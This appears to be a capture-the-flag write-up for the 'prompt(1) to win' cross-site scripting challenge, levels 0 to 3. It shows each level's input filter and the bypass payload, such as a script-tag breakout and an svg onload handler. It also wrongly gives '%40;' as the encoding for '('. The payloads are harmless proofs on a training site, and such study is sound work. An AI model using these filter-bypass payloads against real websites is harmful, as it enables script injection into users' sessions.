# prompt(1) to win
## 0 
**Solve**

```HTML
"><script>prompt(1)</script>

```
<img width="500" src="https://user-images.githubusercontent.com/68285613/147693465-ee262fcc-5b5f-4933-9d9a-e8ab593cf366.png">

<br>

## 1
**Explain**

```JavaScript
var stripTagsRE = /<\/?[^>]+>/gi;
input = input.replace(stripTagsRE, '');
```
Need to bypass the ```input.replace``` part.

<br>

**Readings**
- [What's the meaning of /gi in a regex? [duplicate]](https://stackoverflow.com/questions/27916055/whats-the-meaning-of-gi-in-a-regex/27916089)

<br>

**Solve**

*Remember to add a apace behind ```(1)```, so that it will be able to use prompt(1).*

```JavaScript
<svg onload=prompt(1) 
```

<img width="500" src="https://user-images.githubusercontent.com/68285613/147695438-906a1682-fb06-4ee3-98b5-bee70ab631a3.png">

<br>

## 2
**Explain**

```JavaScript
input = input.replace(/[=(]/g, '');
```

Need to bypass the ```input.replace``` part.

<br>

<img width="500" src="https://user-images.githubusercontent.com/68285613/147696395-81b4a6de-feea-496a-bb89-8b81e591fb87.png">

The ```=``` and ```( ``` are missing.

<br>

<img width="500" src="https://user-images.githubusercontent.com/68285613/147698634-ab20250b-d195-4650-b70c-38d75363a9db.png">

The ```<h1``` part will make prompt(1) appear on screen.

> ```%40;``` is HTML number of ```(```.

By altering the tag ```<h1``` into other tags, might ended up being able to use prompt(1).

<br>

**Readings**

- [w3schools - svg](https://www.w3schools.com/HTML/html5_svg.asp)

<br>

**Solve**

<img width="500" src="https://user-images.githubusercontent.com/68285613/147732371-b7f0aed4-0777-4b5a-a56f-d01af8214cbf.png">

SVG is XML based, which means that every element is available within the SVG DOM.

<br>

## 3
**Explain**

```input = input.replace(/->/g, '_');```


<br>

**Solve**

<img width="500" src="https://user-images.githubusercontent.com/68285613/147734370-19e288b3-e257-41cf-adac-8948e52d21ba.png">



